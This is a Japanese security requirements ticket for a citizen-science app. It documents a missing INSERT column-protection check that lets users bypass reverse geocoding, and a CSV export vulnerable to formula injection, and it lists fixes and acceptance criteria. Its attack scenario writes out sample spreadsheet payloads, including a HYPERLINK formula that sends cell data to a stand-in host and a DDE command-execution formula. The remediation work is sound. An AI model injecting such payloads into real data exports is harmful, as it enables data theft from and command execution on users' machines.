# REQ-244: 研究データ完全性 — CSV 数式インジェクションと INSERT 列保護の穴

## 背景
ザリダスはサーバー側の書き込み API を持たず、クライアントが Supabase PostgREST へ**直接 insert** する構成である（認可は RLS が担う）。投稿の一部の列（地名・水系・自治体など）は自由文字列で、逆ジオコーディング（enrich-place Edge Function・service_role）が後から付与する想定になっている。しかし INSERT 時の列保護トリガーがこれらを保護しておらず、認証ユーザーが**任意の地名・水系・標高・自治体**を投稿に設定できる。その値は公開データセット（CSV/GeoJSON）・地図ポップアップ・地名 SEO ページへ流れ、(1) 市民科学データの信頼性を汚染し、(2) CSV の数式無害化不足と組み合わさって**フォーミュラインジェクション**の配送経路になる。両者は根因（INSERT 列保護欠落）と配送（CSV エスケープ不足）の関係にある。

## 現状の問題
（ファイルパス:行番号つき）

### 1.（Medium）INSERT 列保護がジオメタデータ列を放置し、付与処理をバイパスできる
- `protect_post_insert_columns`（`supabase/schema.sql:952-989`）は一般ユーザー INSERT 時に `status:='pending'`・`is_official:=FALSE`・`ai_result:=NULL` 等をリセットするが、**`locality` / `water_body` / `is_on_water` / `elevation_m` / `geo_enriched_at` / `geo_source` を一切リセットしない**。`municipality` も CHECK 制約なし（`schema.sql:39`、`migrations/20260615000004_*.sql:22-23` は `TEXT`）。
- `auth_insert ON posts WITH CHECK (auth.uid()=user_id)`（`schema.sql:769`）は `user_id` 以外の列値を制約しない。よって認証ユーザーは自分の投稿に**任意のジオメタデータ**を設定できる。
- 付与トリガー `trigger_enrich_place`（`migrations/20260615000004_*.sql:185-253`）は冪等ガード `IF NEW.geo_enriched_at IS NOT NULL THEN RETURN NEW`（`:203`）を持つため、**攻撃者が INSERT 時に `geo_enriched_at` を自分でセットすると付与処理が丸ごとスキップ**され、偽の地名・水系・標高が上書きされずに永続化する。
- **攻撃シナリオ**: 認証ユーザーが `{ lat, lng, geo_enriched_at:'2026-01-01T00:00:00Z', locality:'<偽字名 or 数式ペイロード>', water_body:'…', elevation_m:9999 }` を直接 insert。逆ジオ付与は起動せず攻撃者値が残り、承認後に公開 CSV/GeoJSON・地図ポップアップ（`MapView` の locality/water_body 表示）・地名ロングテール SEO ページへ反映される。

### 2.（Medium）公開 CSV のセルが数式先頭文字を無害化していない（CSV Formula Injection）
- `src/app/dataset/zaridasu.csv/route.ts:154-159`（`csvCell`）は区切り文字対策のみ:
  ```ts
  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s   // 数式無害化なし
  ```
  数式先頭文字（`= + - @`、タブ、CR）を無害化していない。出力列 `SELECT_COLUMNS` には自由文字列の `locality` / `water_body` / `municipality` が含まれる。
- **攻撃シナリオ**: 上記 1 で `water_body = '=HYPERLINK("https://evil.example/"&A1,"click")'` や `=cmd|'/c calc'!A1` 等を持つ投稿が承認される（管理者は当該列を React テキストとして閲覧するため見逃しやすく、AI 自動承認経路もある）。研究者・自治体が `/dataset/zaridasu.csv` を Excel/LibreOffice/Sheets で開くと数式が評価され、外部通信・データ流出・（環境により）コマンド実行に至る。
- GeoJSON は JSON なので数式評価は無いが、値の出所が同一のため 1 の是正が本質的な防御になる。

## 目的
INSERT 時にサーバー付与列（ジオメタデータ）をユーザー入力から保護し、付与処理のバイパスを塞ぐ。あわせて公開 CSV のセルを数式無害化し、市民科学データの信頼性とダウンロード利用者の安全を守る。

## 要件

### 機能要件
- [ ] FR-244-01: `protect_post_insert_columns` に、一般ユーザー（管理者・service_role 以外）の INSERT 時 `NEW.locality/water_body/is_on_water/elevation_m/geo_enriched_at/geo_source := NULL` を追加する。これにより攻撃者が `geo_enriched_at` を先置きして enrich-place をスキップする経路を塞ぐ（付与は必ず service_role トリガー経由に戻る）。
- [ ] FR-244-02: `municipality` を許可リスト（`src/lib/constants.ts` の `MUNICIPALITIES`）に一致する CHECK 制約化、または付与列と同様に一般ユーザー入力を無効化し、正規化された値のみ保存されるようにする。
- [ ] FR-244-03: `csvCell` を、値が `= + - @`・タブ・CR のいずれかで始まる場合に先頭へ `'`（または安全な前置文字）を付与してから引用符処理するよう修正する。全出力セル（特に `locality`/`water_body`/`municipality`）に適用する。
- [ ] FR-244-04: 変更後、既存投稿のうち既に汚染された可能性のあるジオメタデータ列の扱い（再付与 or 監査）を運用手順化する（過去データのクリーンアップ方針）。

### 非機能要件
- [ ] NFR-244-01: 変更は正本 `schema.sql` と追補 migration の両方に反映し `schema:check` を通す。正規の enrich-place 付与フロー（service_role）が回帰しないこと。
- [ ] NFR-244-02: CSV 無害化は既存の区切り/引用符エスケープを壊さず、通常の地名（`=` 等で始まらない値）が視覚的に変化しないこと。
- [ ] NFR-244-03: DB 側の列保護を第一の境界とし、CSV 無害化は多層防御の二次線として併用する（REQ-213 の「真の境界は DB」方針に整合）。

## 受入条件
- [ ] AC-01: 一般ユーザーが `geo_enriched_at`/`locality`/`water_body`/`elevation_m` 等を指定して insert しても、それらが保存されず（NULL 化）、enrich-place が正規に付与する。
- [ ] AC-02: `municipality` に許可リスト外の値を入れた投稿が拒否 or 正規化される。
- [ ] AC-03: 数式先頭文字（`= + - @` / タブ / CR）で始まるセル値が CSV 出力で無害化され、表計算ソフトで数式評価されない。
- [ ] AC-04: 正規の投稿・地名付与・CSV/GeoJSON 出力・地図表示が回帰しない。
- [ ] AC-05: 汚染可能性のある既存データの監査/再付与方針が記録されている。

## 影響範囲
- `supabase/schema.sql`（`protect_post_insert_columns`・`municipality` 制約）＋対応 migration
- `src/app/dataset/zaridasu.csv/route.ts`（`csvCell`）／`src/app/dataset/zaridasu.geojson/route.ts`（値の出所是正の恩恵）
- `src/components/features/map/MapView.tsx`（locality/water_body 表示の信頼性向上）／地名 SEO ページ（`/area/*`）
- 関連 REQ: REQ-213（zod 入力検証・DB 境界）、REQ-231（逆ジオコーディング付与）、REQ-230（オープンデータ）、REQ-227/228（種×地域ページ）。

## 優先度
- **緊急度**: Medium / **重要度**: Medium〜High
- **理由**: 市民科学データの信頼性（卒研の成果指標そのもの）を任意ユーザーが汚染でき、かつ公開 CSV を通じてダウンロード利用者（研究者・自治体）に数式インジェクションが届き得る。根因の INSERT 列保護追加と CSV 無害化はいずれも局所的・低リスクで、まとめて対処すると費用対効果が高い。
